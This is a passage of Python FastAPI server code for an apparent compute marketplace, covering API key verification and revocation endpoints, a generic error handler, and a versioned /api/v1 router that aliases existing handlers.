        f["download_path"] = f"/volumes/{volume_id}/blobs/{f['sha256']}"
    return res


@app.post("/keys/{jti}/revoke")
def revoke_key_by_jti(jti: str, user: dict = Security(get_current_user),
                      db: Session = Depends(get_db)):
    me = get_user_by_username(db, _username(user))
    owned = {k["jti"] for k in list_issued_keys(db, me.id)}
    if jti not in owned:
        raise HTTPException(status_code=404, detail="Key not found")
    revoke_jti(db, jti)
    audit(db, "apikey.revoke", actor=me, resource_type="api_key", resource_id=jti)
    return {"status": "ok", "jti": jti, "revoked": True}


@app.get("/verify_api_key")
def verify_api_key(x_api_key: str = Header(..., alias="X-API-KEY"),
                   db: Session = Depends(get_db)):
    try:
        data = decode_api_key(x_api_key)
    except ValueError as e:
        raise HTTPException(status_code=401, detail=str(e))
    if is_jti_revoked(db, data["jti"]):
        raise HTTPException(status_code=401, detail="Key revoked")
    return {"status": "valid", "username": data["u"], "jti": data["jti"],
            "scopes": data.get("scopes", [])}


@app.post("/revoke_api_key")
def revoke_api_key(x_api_key: str = Header(..., alias="X-API-KEY"),
                   user: dict = Security(get_current_user),
                   db: Session = Depends(get_db)):
    try:
        data = decode_api_key(x_api_key)
    except ValueError as e:
        raise HTTPException(status_code=401, detail=str(e))
    if data["u"] != _username(user):
        raise HTTPException(status_code=403, detail="Cannot revoke another user's key")
    revoke_jti(db, data["jti"])
    return {"status": "ok", "msg": "Key revoked"}


# ------------------- GLOBAL ERROR HANDLER -------------------

@app.exception_handler(Exception)
async def unhandled_exc(request: Request, exc: Exception):
    # Don't leak stack traces to clients; log server-side in real deployment.
    return JSONResponse(status_code=500, content={"detail": "Internal server error"})


# ---------------------------------------------------------------------------
# /api/v1 — the versioned, resource-shaped public API.
#
# The legacy verb routes (/launch, /request_vm, /register_specs, ...) keep working
# so nothing that exists today breaks. New integrations should use these. They are
# thin aliases onto the SAME handlers — one implementation, one set of guarantees,
# no drift. This is what the generated TypeScript/OpenAPI client should target.
# ---------------------------------------------------------------------------
from fastapi import APIRouter

v1 = APIRouter(prefix="/api/v1")

# --- marketplace ---
v1.add_api_route("/marketplace/nodes", public_specs, methods=["GET"], tags=["marketplace"])
v1.add_api_route("/marketplace/nodes/{public_id}", public_spec_detail, methods=["GET"], tags=["marketplace"])
v1.add_api_route("/marketplace/stats", marketplace_stats, methods=["GET"], tags=["marketplace"])
v1.add_api_route("/marketplace/pricing-suggestion", suggest_price, methods=["GET"], tags=["marketplace"])
v1.add_api_route("/templates", list_templates, methods=["GET"], tags=["compute"])

# --- deployments (VMs) ---
v1.add_api_route("/deployments", list_my_vms, methods=["GET"], tags=["compute"])
v1.add_api_route("/deployments", quick_launch, methods=["POST"], tags=["compute"])
v1.add_api_route("/deployments/{vm_id}", get_my_vm, methods=["GET"], tags=["compute"])
v1.add_api_route("/deployments/{vm_id}/stop", stop_my_vm, methods=["POST"], tags=["compute"])
v1.add_api_route("/deployments/{vm_id}/extend", extend_my_vm, methods=["POST"], tags=["compute"])
v1.add_api_route("/deployments/{vm_id}/events", vm_events, methods=["GET"], tags=["compute"])

# --- wallet ---
v1.add_api_route("/wallet", wallet, methods=["GET"], tags=["wallet"])
v1.add_api_route("/wallet/deposits", deposit_funds, methods=["POST"], tags=["wallet"])
v1.add_api_route("/wallet/withdrawals", withdraw, methods=["POST"], tags=["wallet"])

# --- seller ---
v1.add_api_route("/seller/nodes", register_specs, methods=["POST"], tags=["seller"])
v1.add_api_route("/seller/earnings", seller_earnings, methods=["GET"], tags=["seller"])

# --- account ---
v1.add_api_route("/accounts", register_user, methods=["POST"], tags=["account"])
v1.add_api_route("/api-keys", create_api_key, methods=["POST"], tags=["account"])
v1.add_api_route("/me", whoami_profile, methods=["GET"], tags=["account"])

app.include_router(v1)
